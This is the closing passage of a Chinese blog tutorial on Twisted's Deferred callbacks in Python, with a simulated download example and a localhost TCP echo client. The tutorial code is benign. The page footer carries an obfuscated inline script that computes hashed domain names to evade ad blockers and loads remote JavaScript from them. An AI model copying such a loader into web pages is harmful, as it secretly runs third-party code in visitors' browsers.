    <span class="token keyword">def</span> <span class="token function">work</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#模拟网络下载</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'模拟网络下载延时操作，等待3秒。。。'</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>defer<span class="token punctuation">.</span>callback<span class="token punctuation">(</span><span class="token string">'finish'</span><span class="token punctuation">)</span><span class="token comment">#执行回调</span>
    <span class="token keyword">def</span> <span class="token function">handle_success</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'处理完成，进行参数的接收：%s'</span><span class="token operator">%</span>result<span class="token punctuation">)</span><span class="token comment">#处理完毕后的信息输出</span>
    <span class="token keyword">def</span> <span class="token function">handle_error</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>exp<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#错误回调</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'程序出错：%s'</span><span class="token operator">%</span>exp<span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务调用结束~~~~'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    defer_client<span class="token operator">=</span>DeferHandle<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获得当前的回调操作</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>callWhenRunning<span class="token punctuation">(</span>defer_client<span class="token punctuation">.</span>work<span class="token punctuation">)</span><span class="token comment">#执行耗时操作</span>
    defer_client<span class="token punctuation">.</span>get_defer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>addCallback<span class="token punctuation">(</span>defer_client<span class="token punctuation">.</span>handle_success<span class="token punctuation">)</span><span class="token comment">#设置回调处理 执行完毕后的回调</span>
    defer_client<span class="token punctuation">.</span>get_defer<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>addErrback<span class="token punctuation">(</span>defer_client<span class="token punctuation">.</span>handle_error<span class="token punctuation">)</span><span class="token comment">#错误输出时的回调</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>callLater<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span>stop<span class="token punctuation">)</span><span class="token comment">#5秒后停止Reactor调用</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#启用事件的循环</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<p>在整个程序执行完毕后，就可以直接利用所设置的calback()操作进行操作完成后的调用，基于这样的操作模型就减少了并发编程的使用，但使用twisted程序都是在解决网络通讯的性能问题，那么最佳的做法肯定就是Defered应用在网络的开发环境中。<br> 通过Deffer模型实现TCP的echo客户端</p> 
<pre><code class="prism language-python"><span class="token comment">#----------defer TCP 客户端-------</span>
<span class="token keyword">import</span> twisted
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>defer
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor
<span class="token keyword">import</span> twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>threads<span class="token comment">#自己控制的线程</span>
<span class="token keyword">import</span> time
SERVER_HOST<span class="token operator">=</span><span class="token string">'localhost'</span>
SERVER_PORT<span class="token operator">=</span><span class="token number">8080</span>
<span class="token keyword">class</span> <span class="token class-name">DeferClient</span><span class="token punctuation">(</span>twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol<span class="token punctuation">.</span>Protocol<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#回调处理类</span>
    <span class="token keyword">def</span> <span class="token function">connectionMade</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#创建连接</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'服务器连接成功，可以进行通信，如果要结束会话，直接回车即可'</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#信息发送</span>
    <span class="token keyword">def</span> <span class="token function">dataReceived</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#接收服务端发送的数据</span>
        content<span class="token operator">=</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#接收服务端发送的数据</span>
        twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>threads<span class="token punctuation">.</span>deferToThread<span class="token punctuation">(</span>self<span class="token punctuation">.</span>handle_request<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>addCallback<span class="token punctuation">(</span>self<span class="token punctuation">.</span>handle_success<span class="token punctuation">)</span>
    <span class="token keyword">def</span> <span class="token function">handle_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#数据处理过程</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'客户端 对服务端的数据 %s 进行处理，可能会产生1~2秒延迟。。。'</span><span class="token operator">%</span>content<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> content <span class="token comment">#返回处理结果</span>
    <span class="token keyword">def</span> <span class="token function">handle_success</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#操作处理完毕</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'处理完成，进行参数的接收：%s'</span><span class="token operator">%</span>result<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#下一的数据发送</span>
    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#数据发送 自定义方法</span>
        input_data<span class="token operator">=</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'请输入要发送的信息:'</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> input_data<span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>write<span class="token punctuation">(</span>input_data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>loseConnection<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#关闭连接</span>
<span class="token keyword">class</span> <span class="token class-name">DefaultClientFactory</span><span class="token punctuation">(</span>twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>protocol<span class="token punctuation">.</span>ClientFactory<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#客户端工厂</span>
    protocol<span class="token operator">=</span>DeferClient<span class="token comment">#设置回调处理</span>
    clientConnectionLost<span class="token operator">=</span>clientConnectionFailed<span class="token operator">=</span><span class="token keyword">lambda</span> self<span class="token punctuation">,</span>connector<span class="token punctuation">,</span>reason<span class="token punctuation">:</span>twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>connectTCP<span class="token punctuation">(</span>SERVER_HOST<span class="token punctuation">,</span>SERVER_PORT<span class="token punctuation">,</span>DefaultClientFactory<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#服务监听</span>
    twisted<span class="token punctuation">.</span>internet<span class="token punctuation">.</span>reactor<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#程序运行</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre> 
<p>这种交互的模型主要是Deferred优化了客户端之中的处理结构，在实际开发中，一个服务端有可能继续调用其他的服务器端，而这个服务器还有可能同时要处理用户的请求</p> 
<p><br></p>
<hr>
<p></p> 
<ul><li><em>无智亦无得，以无所得故</em></li></ul>
                </div>
                
                

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>